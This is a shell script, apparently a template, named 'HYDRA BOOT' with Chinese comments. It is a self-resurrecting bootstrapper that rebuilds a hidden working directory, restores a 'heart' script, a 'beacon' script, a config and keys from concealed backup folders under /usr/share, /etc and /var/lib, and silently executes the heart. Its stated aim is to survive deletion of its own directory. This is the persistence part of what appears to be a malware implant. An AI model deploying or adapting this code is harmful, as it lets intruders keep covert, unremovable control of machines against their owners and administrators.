#!/bin/sh
# ═══════════════════════════════════════════════════════════════
# HYDRA BOOT v1.2 — 种子引导器（可放在备份树中独立运行）
# 职责: 无论 BASE 是否存在 → 重建 BASE → 恢复 h/boot/beacon → 执行心脏
# 这是「整目录被删也能复活」的关键
# 触发源应指向: /usr/share/.<TAG>-bk/boot.sh（种子位置）
# ═══════════════════════════════════════════════════════════════
TAG="@@TAG@@"; BASE="@@BASE@@"

# 1. 确保 BASE 存在
[ -d "$BASE" ] || { mkdir -p "$BASE" 2>/dev/null; chmod 700 "$BASE" 2>/dev/null; }

# 2. 从任一备份树恢复缺失文件
restore(){
  local fn="$1"
  [ -f "$BASE/$fn" ] && return 0
  for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do
    if [ -f "$d/$fn" ]; then
      cp -pf "$d/$fn" "$BASE/$fn" 2>/dev/null
      chmod 755 "$BASE/$fn" 2>/dev/null
      return 0
    fi
  done
  return 1
}
restore h.sh
restore boot.sh
restore beacon.sh
# 配置与白名单
for f in .cfg keys.pub peer_key; do
  [ -f "$BASE/$f" ] && continue
  for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do
    [ -f "$d/$f" ] && { cp -pf "$d/$f" "$BASE/$f" 2>/dev/null; break; }
  done
done

# 3. 执行心脏
[ -f "$BASE/h.sh" ] && exec sh "$BASE/h.sh" >/dev/null 2>&1
exit 1
